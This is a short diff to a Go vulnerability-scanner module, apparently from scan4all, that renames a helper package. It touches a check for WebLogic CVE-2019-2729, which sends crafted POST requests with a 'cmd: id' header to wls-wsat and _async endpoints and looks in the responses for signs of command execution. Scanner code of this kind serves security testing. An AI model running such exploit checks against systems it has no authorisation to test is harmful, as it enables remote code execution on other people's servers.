@@ -2,7 +2,7 @@ package weblogic
 
 import (
 	"fmt"
-	"github.com/hktalent/scan4all/pkg"
+	"github.com/hktalent/scan4all/lib/util"
 	"strings"
 )
 
@@ -3529,11 +3529,11 @@ func CVE_2019_2729(url string) bool {
 	header["Content-Type"] = "text/xml"
 	header["cmd"] = "id"
 	header["SOAPAction"] = ""
-	if req1, err := pkg.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, false, header); err == nil {
-		if req2, err2 := pkg.HttpRequset(url+"/_async/AsyncResponseService", "POST", payload2, false, header); err2 == nil {
-			req3, _ := pkg.HttpRequset(url+"/_async/favicon.ico", "GET", "", false, nil)
-			if (req1.StatusCode == 200 && pkg.StrContains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
-				pkg.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2019_2729|%s\n", url))
+	if req1, err := util.HttpRequset(url+"/wls-wsat/CoordinatorPortType", "POST", payload1, false, header); err == nil {
+		if req2, err2 := util.HttpRequset(url+"/_async/AsyncResponseService", "POST", payload2, false, header); err2 == nil {
+			req3, _ := util.HttpRequset(url+"/_async/favicon.ico", "GET", "", false, nil)
+			if (req1.StatusCode == 200 && util.StrContains(req1.Body, "uid")) || (req2.StatusCode == 202 && strings.Contains(req3.Body, "Vulnerable")) {
+				util.GoPocLog(fmt.Sprintf("Found vuln Weblogic CVE_2019_2729|%s\n", url))
 				return true
 			}
 		}
